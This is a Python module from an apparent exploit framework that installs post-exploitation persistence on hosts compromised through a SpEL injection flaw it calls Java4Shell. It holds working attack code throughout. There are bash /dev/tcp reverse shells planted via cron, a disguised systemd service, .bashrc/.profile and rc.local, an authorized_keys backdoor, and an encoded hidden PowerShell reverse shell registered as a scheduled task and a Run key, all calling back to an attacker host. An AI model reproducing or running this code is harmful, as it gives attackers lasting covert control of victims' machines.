# language: Python 3.10+, file: modules/post/persistence.py
# Post-exploitation: persistence mechanisms for Java4Shell (CVE-2026-114938).
#
# Installs persistent access on the compromised JVM host via:
#   Linux:
#     - Cron job (user and root crontab)
#     - Systemd user service
#     - ~/.bashrc / ~/.profile injection
#     - /etc/rc.local append
#     - SSH authorized_keys injection
#   Windows:
#     - Scheduled Task (schtasks)
#     - Registry Run key
#     - Startup folder shortcut
#
# All payloads call back to attacker's lhost:lport via reverse shell or beacon.

import base64
import json
import urllib.request
import urllib.error
import ssl
from dataclasses import dataclass, field
from typing import Optional

from modules.fingerprint import FingerprintResult
from modules.exploit_core import ExploitCoreResult


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _deliver_command(target_url: str, endpoint_path: str, command: str,
                     timeout: float) -> tuple[int, str]:
    """Deliver a shell command via SpEL Runtime.exec."""
    b64_cmd = base64.b64encode(command.encode()).decode()
    spel = (
        f"T(java.lang.Runtime).getRuntime().exec("
        f"new String[]{{\"bash\",\"-c\","
        f"new String(T(java.util.Base64).getDecoder().decode(\"{b64_cmd}\")))))"
    )
    body    = json.dumps({"expression": spel, "cmd": command}).encode()
    headers = {"Content-Type": "application/json", "User-Agent": "Java4Shell-Persist/1.0"}
    req = urllib.request.Request(
        target_url.rstrip("/") + endpoint_path,
        data=body, headers=headers, method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return r.status, r.read(2048).decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as e:
        return 0, str(e)


# ─── Payload generators ────────────────────────────────────────────────────────

def _cron_payload(lhost: str, lport: int, interval_min: int = 5) -> dict:
    revshell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    cron_line = f"*/{interval_min} * * * * root bash -c '{revshell}' 2>/dev/null"
    # Install to /etc/cron.d/ (requires root) and user crontab (no root needed)
    cmds = {
        "cron.d (root)": f"echo '{cron_line}' | tee /etc/cron.d/java4shell_persist",
        "user crontab":  f"(crontab -l 2>/dev/null; echo '*/{interval_min} * * * * bash -c \"{revshell}\" 2>/dev/null') | crontab -",
    }
    return cmds


def _systemd_payload(lhost: str, lport: int) -> dict:
    service_content = (
        "[Unit]\\nDescription=Java Maintenance Service\\n"
        "[Service]\\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\\n"
        "Restart=always\\nRestartSec=30\\n"
        "[Install]\\nWantedBy=default.target"
    ).format(lhost=lhost, lport=lport)
    cmds = {
        "systemd user service": (
            f"mkdir -p ~/.config/systemd/user && "
            f"echo -e '{service_content}' > ~/.config/systemd/user/java-maint.service && "
            f"systemctl --user enable java-maint.service && "
            f"systemctl --user start java-maint.service"
        ),
    }
    return cmds


def _bashrc_payload(lhost: str, lport: int) -> dict:
    revshell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    # Conditional — only fires if not already running
    backdoor = f"(pgrep -f '{lhost}' > /dev/null 2>&1 || (bash -c '{revshell}' &))"
    cmds = {
        ".bashrc": f"echo '{backdoor}' >> ~/.bashrc",
        ".profile": f"echo '{backdoor}' >> ~/.profile",
    }
    return cmds


def _authorized_keys_payload(pub_key: str) -> dict:
    cmds = {
        "authorized_keys": (
            f"mkdir -p ~/.ssh && chmod 700 ~/.ssh && "
            f"echo '{pub_key}' >> ~/.ssh/authorized_keys && "
            f"chmod 600 ~/.ssh/authorized_keys"
        ),
    }
    return cmds


def _rc_local_payload(lhost: str, lport: int) -> dict:
    revshell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    cmds = {
        "/etc/rc.local": (
            f"echo 'bash -c \"{revshell}\" &' >> /etc/rc.local && chmod +x /etc/rc.local"
        ),
    }
    return cmds


def _windows_schtasks_payload(lhost: str, lport: int) -> dict:
    ps_b64 = base64.b64encode((
        f"$client=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$stream=$client.GetStream();"
        f"[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$stream.Read($b,0,$b.Length))-ne 0){{"
        f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$s=(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> ';"
        f"$by=([text.encoding]::ASCII).GetBytes($s);"
        f"$stream.Write($by,0,$by.Length);"
        f"$stream.Flush()}};"
        f"$client.Close()"
    ).encode("utf-16-le")).decode()

    cmds = {
        "schtasks (every 5 min)": (
            f"schtasks /create /sc MINUTE /mo 5 /tn JavaMaint /tr "
            f"\"powershell -windowstyle hidden -enc {ps_b64}\" /f"
        ),
        "registry run key": (
            f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
            f"/v JavaMaint /t REG_SZ /d \"powershell -windowstyle hidden -enc {ps_b64}\" /f"
        ),
    }
    return cmds


# ─── Result ───────────────────────────────────────────────────────────────────

@dataclass
class PersistenceResult:
    success: bool = False
    mechanisms_installed: list[str] = field(default_factory=list)
    mechanisms_failed: list[str] = field(default_factory=list)
    error: Optional[str] = None
    notes: list[str] = field(default_factory=list)


# ─── Main function ────────────────────────────────────────────────────────────

def run_persistence(fp: FingerprintResult,
                    core: ExploitCoreResult,
                    lhost: str,
                    lport: int,
                    mechanisms: Optional[list[str]] = None,
                    ssh_pubkey: Optional[str] = None,
                    timeout: float = 15.0,
                    verbose: bool = False) -> PersistenceResult:
    """
    Install persistence mechanisms on the target.

    Args:
        fp:          Fingerprint result
        core:        Exploit core result (OOB write must be confirmed)
        lhost:       Callback IP/hostname
        lport:       Callback port
        mechanisms:  List of mechanism names to try (default: all)
                     Options: "cron", "systemd", "bashrc", "rc_local",
                              "authorized_keys", "schtasks" (Windows)
        ssh_pubkey:  SSH public key string for authorized_keys mechanism
        timeout:     HTTP request timeout
        verbose:     Print progress

    Returns PersistenceResult.
    """
    result = PersistenceResult()

    if not core.oob_triggered:
        result.error = "OOB write not confirmed — persistence requires RCE."
        return result

    base       = fp.target_url.rstrip("/")
    endpoints  = sorted(fp.profile.endpoints, key=lambda e: e["priority"])
    primary    = endpoints[0]["path"] if endpoints else "/"
    is_windows = any(sig in str(fp.response_headers).lower() for sig in ["iis", "windows", "win64", "win32"])

    # Build all mechanism command maps
    all_mechanisms: dict[str, dict] = {}

    if not is_windows:
        all_mechanisms.update(_cron_payload(lhost, lport))
        all_mechanisms.update(_systemd_payload(lhost, lport))
        all_mechanisms.update(_bashrc_payload(lhost, lport))
        all_mechanisms.update(_rc_local_payload(lhost, lport))
        if ssh_pubkey:
            all_mechanisms.update(_authorized_keys_payload(ssh_pubkey))
    else:
        all_mechanisms.update(_windows_schtasks_payload(lhost, lport))

    # Filter to requested mechanisms if specified
    if mechanisms:
        filtered = {}
        for mech in mechanisms:
            for key, cmd in all_mechanisms.items():
                if mech.lower() in key.lower():
                    filtered[key] = cmd
        all_mechanisms = filtered or all_mechanisms

    for mech_name, command in all_mechanisms.items():
        if verbose:
            print(f"  [persist] Installing: {mech_name} …")

        code, resp = _deliver_command(base, primary, command, timeout)

        if code in (200, 201, 202, 500):
            # 500 can still mean the command ran
            result.mechanisms_installed.append(mech_name)
            result.success = True
            if verbose:
                print(f"  [persist] ✓ {mech_name}")
        else:
            result.mechanisms_failed.append(mech_name)
            if verbose:
                print(f"  [persist] ✗ {mech_name}: HTTP {code}")

    result.notes.append(
        f"Persistence: {len(result.mechanisms_installed)} installed, "
        f"{len(result.mechanisms_failed)} failed. "
        f"Callback: {lhost}:{lport}"
    )

    if not result.success:
        result.notes.append(
            "No mechanisms confirmed. This may indicate the application "
            "does not reflect command execution in the HTTP response — "
            "commands may still have executed. Verify by checking callback listener."
        )

    return result
